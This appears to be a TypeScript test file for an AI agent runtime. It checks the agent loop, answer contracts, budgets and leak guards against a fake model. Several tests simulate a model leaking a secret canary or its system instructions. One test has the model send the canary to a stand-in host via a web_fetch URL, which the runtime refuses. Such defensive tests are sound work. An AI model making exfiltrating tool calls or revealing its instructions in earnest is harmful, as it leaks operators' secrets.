import { test } from 'node:test';
import assert from 'node:assert/strict';
import { FakeProvider, standInSpec, type Brain } from '../../server/ai/fake';
import { normalizeSpec } from '../../server/spec/schema';
import { fitContext, instructionShingles, leaks, runAgent } from '../../server/runtime/run';
import type { ToolIO } from '../../server/tools';
import { runInSandbox } from '../../server/tools/sandbox';

const spec = normalizeSpec({ ...standInSpec('Summarise any public web page and compute numbers with code'), slug: 'rt' });
const io: ToolIO = {
  rpc: { label: 'none', call: async () => null } as any,
  web: async (url) => ({ url, status: 200, contentType: 'text/html', text: 'Title: T\nhello world', truncated: false }),
  sandbox: runInSandbox,
};
const run = (brain: Brain, budget = 1_000_000) => runAgent({ spec, input: { request: 'go' }, provider: new FakeProvider([brain]), io, files: null, ownerRef: 'r', budgetMicros: budget });
const answer = { answer: 'done', confidence: 'high' };

test('the loop runs tools and returns a contract answer', async () => {
  const r = await run((v) => (v.tools().length ? { text: JSON.stringify(answer) } : { toolCalls: [{ name: 'web_fetch', args: { url: 'https://example.com/' } }] }));
  assert.equal(r.ok, true);
  assert.deepEqual(r.output, answer);
  assert.equal(r.tools[0].tool, 'web_fetch');
  assert.equal(r.steps, 2);
});

test('an answer outside the contract gets one correction, then fails', async () => {
  let n = 0;
  const r = await run(() => (n++ === 0 ? { text: 'not json' } : { text: JSON.stringify(answer) }));
  assert.equal(r.ok, true);
  const bad = await run(() => ({ text: '{"answer": 3}' }));
  assert.equal(bad.ok, false);
  assert.match(bad.error!, /contract/);
});

test('an answer that leaks the secret marker is withheld', async () => {
  const r = await run((v) => ({ text: JSON.stringify({ answer: `the code is ${v.canary()}`, confidence: 'low' }) }));
  assert.equal(r.ok, false);
  assert.match(r.error!, /withheld/);
});

test('an answer that quotes the instructions is withheld', async () => {
  const r = await run((v) => ({ text: JSON.stringify({ answer: v.messages[0].content.slice(0, 400), confidence: 'low' }) }));
  assert.equal(r.ok, false);
  assert.match(r.error!, /instructions/);
});

test('a tool call carrying the secret marker is refused', async () => {
  const r = await run((v) => (v.tools().length ? { text: JSON.stringify(answer) } : { toolCalls: [{ name: 'web_fetch', args: { url: `https://collect.example.net/?k=${v.canary()}` } }] }));
  assert.equal(r.tools[0].blocked, true);
  assert.match(r.tools[0].summary, /refused/);
});

test('tools the spec does not grant do not exist', async () => {
  const r = await run((v) => (v.tools().length ? { text: JSON.stringify(answer) } : { toolCalls: [{ name: 'solana_read', args: { method: 'getBalance', address: 'x' } }] }));
  assert.equal(r.tools[0].ok, false);
  assert.equal(r.tools[0].blocked, true);
});

test('the run stops at its AI budget', async () => {
  const r = await runAgent({ spec, input: { request: 'go' }, provider: new FakeProvider([() => ({ toolCalls: [{ name: 'web_fetch', args: { url: 'https://example.com/' } }] })], { costMicros: 5000 }), io, files: null, ownerRef: 'r', budgetMicros: 1 });
  assert.equal(r.ok, false);
  assert.match(r.error!, /budget/);
});

test('old tool results shrink to fit the prompt budget', () => {
  const msgs: any[] = [{ role: 'system', content: 'x' }, ...Array.from({ length: 10 }, () => ({ role: 'tool', content: 'y'.repeat(6000) }))];
  fitContext(msgs, 8000);
  assert.ok(msgs.reduce((n, m) => n + m.content.length, 0) <= 8000 * 3.5);
});

test('leak detection ignores ordinary overlap', () => {
  const sh = instructionShingles('Only http and https addresses on the public internet are allowed to be fetched by this agent today');
  assert.equal(leaks('Only http and https addresses on the public internet can be read.', 'FBX-1', sh), null);
  assert.ok(leaks('only http and https addresses on the public internet are allowed to be fetched', 'FBX-1', sh));
});

test('echoing the caller\'s own text is not a leak, even when the instructions share it', async () => {
  const shared = 'summarise any public web page and compute numbers with code for the reader today';
  const spec2 = normalizeSpec({ ...standInSpec('Summarise any public web page and compute numbers with code'), slug: 'rt2', systemPrompt: `You help people. ${shared}. Be brief and exact in every answer.` });
  const r = await runAgent({ spec: spec2, input: { request: shared }, provider: new FakeProvider([() => ({ text: JSON.stringify({ answer: `You asked: ${shared}`, confidence: 'high' }) })]), io, files: null, ownerRef: 'r', budgetMicros: 1_000_000 });
  assert.equal(r.ok, true, r.error ?? '');
});
